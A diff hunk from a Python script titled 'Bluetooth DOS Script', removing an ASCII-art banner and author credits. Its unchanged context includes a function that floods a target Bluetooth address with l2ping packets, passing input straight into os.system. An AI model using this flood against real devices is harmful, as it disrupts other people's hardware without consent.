@@ -6,20 +6,7 @@ def DOS(target_addr, packages_size):
     os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)
 
 def printLogo():
-    print('\x1b[37;4mhttps://github.com/jieggiI\x1b[0m')
-    print('\x1b[37;36m')
     print('                            Bluetooth DOS Script                            ')
-    print('+-------------------------------------------------------------------------+ ')
-    print('|  _ __ ___   __ _  __| | ___   | |__  _   _     (_|_) ___  __ _  __ _(_) | ')
-    print("| | '_ ` _ \ / _` |/ _` |/ _ \  | '_ \| | | |    | | |/ _ \/ _` |/ _` | | | ")
-    print('| | | | | | | (_| | (_| |  __/  | |_) | |_| |    | | |  __/ (_| | (_| | | | ')
-    print('| |_| |_| |_|\__,_|\__,_|\___|  |_.__/ \__, |   _/ |_|\___|\__, |\__, |_| | ')
-    print('|                                      |___/   |__/        |___/ |___/    | ')
-    print('+-------------------------------------------------------------------------+ ')
-    print('\x1b[0m')
-    print("forked by xanonDev")
-    print("https://github.com/xanonDev")
-
 def main():
     printLogo()
     time.sleep(0.1)
